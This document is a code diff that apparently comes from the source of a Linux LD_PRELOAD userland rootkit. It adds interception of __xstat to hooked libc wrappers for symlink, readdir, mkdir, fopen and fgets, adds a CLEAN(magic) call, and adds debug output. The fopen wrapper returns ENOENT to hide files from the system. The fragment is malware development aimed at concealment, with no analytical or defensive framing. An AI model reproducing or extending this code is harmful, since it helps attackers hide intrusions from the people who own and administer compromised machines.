@@ -328,6 +328,7 @@ int unlinkat(int dirfd, const char *path, int flags)
 int symlink(const char *path1, const char *path2)
 { 
 	HOOK(symlink);
+	HOOK(__xstat);
 	#ifdef DEBUG 
 	printf("[!] symlink hooked");
 	#endif
@@ -456,6 +457,7 @@ int renameat(int olddirfd, const char *oldpath, int newdirfd, const char *newpat
 struct dirent *readdir(DIR *dirp)
 { 
 	HOOK(readdir);
+	HOOK(__xstat);
 	#ifdef DEBUG 
 	printf("[!] readdir hooked\n"); 
 	#endif
@@ -531,6 +533,7 @@ int fchdir(int fildes)
 int mkdir(const char *pathname, mode_t mode)
 { 
 	HOOK(mkdir);
+	HOOK(__xstat);
 	#ifdef DEBUG
 	printf("[!] mkdir hooked\n"); 
 	#endif 
@@ -675,7 +678,8 @@ int access(const char *pathname, int mode)
 }
 FILE *fopen(const char *pathname, const char *mode)
 { 
-	HOOK(fopen); 
+	HOOK(fopen);
+       	HOOK(__xstat);	
 	#ifdef DEBUG 
 	printf("[!] fopen hooked\n"); 
 	#endif 
@@ -690,6 +694,7 @@ FILE *fopen(const char *pathname, const char *mode)
 		errno = ENOENT;
 		return NULL;
 	}
+	CLEAN(magic);
 	return old_fopen(pathname, mode);
 }	
 
@@ -699,6 +704,10 @@ char *fgets(char *s, int size, FILE *stream)
 	char *p;
 	struct stat filestat;
 	HOOK(fgets); 
+	HOOK(__xstat); 
+	#ifdef DEBUG 
+	printf("[!] fgets hooked\n"); 
+	#endif
 	p = old_fgets(s, size, stream);
 	if (p == NULL)
 		return(p);
